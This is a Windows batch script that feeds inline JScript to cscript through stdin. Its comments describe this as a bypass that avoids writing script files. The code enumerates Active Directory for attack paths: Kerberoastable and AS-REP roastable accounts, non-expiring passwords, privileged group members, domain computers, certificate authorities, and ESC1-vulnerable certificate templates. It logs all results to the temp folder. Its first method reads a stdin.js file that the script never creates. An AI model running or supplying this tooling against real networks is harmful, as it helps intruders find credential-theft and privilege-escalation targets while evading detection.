@echo off
setlocal enabledelayedexpansion

REM ===============================================
REM run_stdin_js.bat - JScript fed to cscript via stdin
REM Bypass: NO .js / .vbs / .ps1 / .bat file written
REM Output: %TEMP%\ad_recon.log
REM ===============================================

set "OUT=%TEMP%"
set "LOG=%OUT%\ad_recon.log"

echo === AD RECON via inline cscript stdin ===
echo Output: %LOG%
echo.

cscript.exe //NoLogo //E:JScript "%OUT%\nul" < "%OUT%\stdin.js" 2>&1

REM Try alternate: write JS via debug.exe trick or via CON
echo ----------------------------------------
echo METHOD 2: Using for-loop to generate JS
echo ----------------------------------------

REM Method: write JS via ECHO commands piped to cscript
(
    echo var fso = new ActiveXObject^("Scripting.FileSystemObject"^);
    echo var shell = new ActiveXObject^("WScript.Shell"^);
    echo var tempDir = shell.ExpandEnvironmentStrings^("%TEMP%"^);
    echo var logFile = tempDir + "\\ad_recon.log";
    echo var lf = fso.CreateTextFile^(logFile, true^);
    echo function L^(s^){ WScript.Echo^(s^); lf.WriteLine^(s^); }
    echo var dom;
    echo try {
    echo   var r = new ActiveXObject^("ADSystemInfo"^);
    echo   var rootDSE = GetObject^("LDAP://RootDSE"^);
    echo   dom = rootDSE.Get^("defaultNamingContext"^);
    echo   L^("[1] Domain: " + dom^);
    echo } catch^(e^) { L^("ERROR getDomain: " + e^); exit^(1^); }
    echo L^("[2] All Kerberoastable users (SPN)"^);
    echo try {
    echo   var conn = new ActiveXObject^("ADODB.Connection"^);
    echo   conn.Provider = "ADsDSOObject";
    echo   conn.Open^("Active Directory Provider"^);
    echo   var rs = conn.Execute^('^<LDAP://'+dom+'^>;(objectCategory=user^)(servicePrincipalName=*^);samaccountname,servicePrincipalName;SubTree'^);
    echo   var n = 0;
    echo   while ^(!rs.EOF^) {
    echo     var name = rs.Fields^("samaccountname"^).Value;
    echo     var spn = rs.Fields^("servicePrincipalName"^).Value;
    echo     L^("  KERBEROASTABLE: " + name + " -^> " + spn^);
    echo     n++; rs.MoveNext^(^);
    echo   }
    echo   L^("  Count: " + n^);
    echo   rs.Close^(^); conn.Close^(^);
    echo } catch^(e^) { L^("ERROR kerberoast: " + e^); }
    echo L^("[3] All AS-REP Roastable (DONT_REQ_PREAUTH)"^);
    echo try {
    echo   var conn = new ActiveXObject^("ADODB.Connection"^);
    echo   conn.Provider = "ADsDSOObject";
    echo   conn.Open^("Active Directory Provider"^);
    echo   var rs = conn.Execute^('^<LDAP://'+dom+'^>;(objectCategory=user^)(userAccountControl:1.2.840.113556.1.4.803:=4194304^);samaccountname;SubTree'^);
    echo   var n = 0;
    echo   while ^(!rs.EOF^) {
    echo     L^("  AS-REP: " + rs.Fields^("samaccountname"^).Value^);
    echo     n++; rs.MoveNext^(^);
    echo   }
    echo   L^("  Count: " + n^);
    echo   rs.Close^(^); conn.Close^(^);
    echo } catch^(e^) { L^("ERROR asrep: " + e^); }
    echo L^("[4] Never-Expires passwords"^);
    echo try {
    echo   var conn = new ActiveXObject^("ADODB.Connection"^);
    echo   conn.Provider = "ADsDSOObject";
    echo   conn.Open^("Active Directory Provider"^);
    echo   var rs = conn.Execute^('^<LDAP://'+dom+'^>;(objectCategory=user^)(userAccountControl:1.2.840.113556.1.4.803:=65536^);samaccountname;SubTree'^);
    echo   var n = 0;
    echo   while ^(!rs.EOF^) {
    echo     L^("  NEVER-EXPIRE: " + rs.Fields^("samaccountname"^).Value^);
    echo     n++; rs.MoveNext^(^);
    echo   }
    echo   L^("  Count: " + n^);
    echo   rs.Close^(^); conn.Close^(^);
    echo } catch^(e^) { L^("ERROR neverexpire: " + e^); }
    echo L^("[5] Privileged group members"^);
    echo var groups = ["Domain Admins","Enterprise Admins","Schema Admins","Account Operators","Backup Operators","Server Operators","Cert Publishers","DnsAdmins","LAPS Operators","Group Policy Creator Owners"];
    echo for ^(var gi = 0; gi ^< groups.length; gi++^) {
    echo   L^("  --- " + groups[gi] + " ---"^);
    echo   try {
    echo     var conn = new ActiveXObject^("ADODB.Connection"^);
    echo     conn.Provider = "ADsDSOObject";
    echo     conn.Open^("Active Directory Provider"^);
    echo     var q = '^<LDAP://'+dom+'^>;(memberOf=CN=' + groups[gi] + ',CN=Users,'+dom+'^);samaccountname;SubTree';
    echo     var rs = conn.Execute^(q^);
    echo     var n = 0;
    echo     while ^(!rs.EOF^) {
    echo       L^("    " + rs.Fields^("samaccountname"^).Value^);
    echo       n++; rs.MoveNext^(^);
    echo     }
    echo     L^("    Count: " + n^);
    echo     rs.Close^(^); conn.Close^(^);
    echo   } catch^(e^) { L^("    ERROR: " + e^); }
    echo }
    echo L^("[6] All domain computers"^);
    echo try {
    echo   var conn = new ActiveXObject^("ADODB.Connection"^);
    echo   conn.Provider = "ADsDSOObject";
    echo   conn.Open^("Active Directory Provider"^);
    echo   var rs = conn.Execute^('^<LDAP://'+dom+'^>;(objectCategory=computer^);name,operatingsystem;SubTree'^);
    echo   var n = 0;
    echo   while ^(!rs.EOF^) {
    echo     L^("  " + rs.Fields^("name"^).Value + " | " + rs.Fields^("operatingsystem"^).Value^);
    echo     n++; rs.MoveNext^(^);
    echo   }
    echo   L^("  Count: " + n^);
    echo   rs.Close^(^); conn.Close^(^);
    echo } catch^(e^) { L^("ERROR computers: " + e^); }
    echo L^("[7] AD CS CAs"^);
    echo try {
    echo   var conn = new ActiveXObject^("ADODB.Connection"^);
    echo   conn.Provider = "ADsDSOObject";
    echo   conn.Open^("Active Directory Provider"^);
    echo   var rs = conn.Execute^('^<LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'+dom+'^>;(objectCategory=pKIEnrollmentService^);name,dnsHostName;SubTree'^);
    echo   var n = 0;
    echo   while ^(!rs.EOF^) {
    echo     L^("  CA: " + rs.Fields^("name"^).Value + " @ " + rs.Fields^("dnsHostName"^).Value^);
    echo     n++; rs.MoveNext^(^);
    echo   }
    echo   L^("  Count: " + n^);
    echo   rs.Close^(^); conn.Close^(^);
    echo } catch^(e^) { L^("ERROR cas: " + e^); }
    echo L^("[8] Certificate Templates + ESC1"^);
    echo try {
    echo   var conn = new ActiveXObject^("ADODB.Connection"^);
    echo   conn.Provider = "ADsDSOObject";
    echo   conn.Open^("Active Directory Provider"^);
    echo   var rs = conn.Execute^('^<LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,'+dom+'^>;(objectClass=pKICertificateTemplate^);name,displayName,msPKI-Certificate-Name-Flag,flags;SubTree'^);
    echo   var n = 0;
    echo   while ^(!rs.EOF^) {
    echo     var tname = rs.Fields^("name"^).Value;
    echo     var disp = rs.Fields^("displayName"^).Value;
    echo     var nameFlag = 0; try { nameFlag = rs.Fields^("msPKI-Certificate-Name-Flag"^).Value; } catch^(e^) {}
    echo     var esc1 = ^(nameFlag ^& 1^) ? "[ESC1!] " : "";
    echo     L^("  " + esc1 + tname + " (display: " + disp + ")"^);
    echo     n++; rs.MoveNext^(^);
    echo   }
    echo   L^("  Count: " + n^);
    echo   rs.Close^(^); conn.Close^(^);
    echo } catch^(e^) { L^("ERROR templates: " + e^); }
    echo L^("=== DONE === Log: " + logFile^);
    echo lf.Close^(^);
) | cscript.exe //NoLogo //E:JScript //B //U 2>&1

if exist "%LOG%" type "%LOG%"

echo ===========================================
echo Done. Log at: %LOG%
echo ===========================================
pause
endlocal
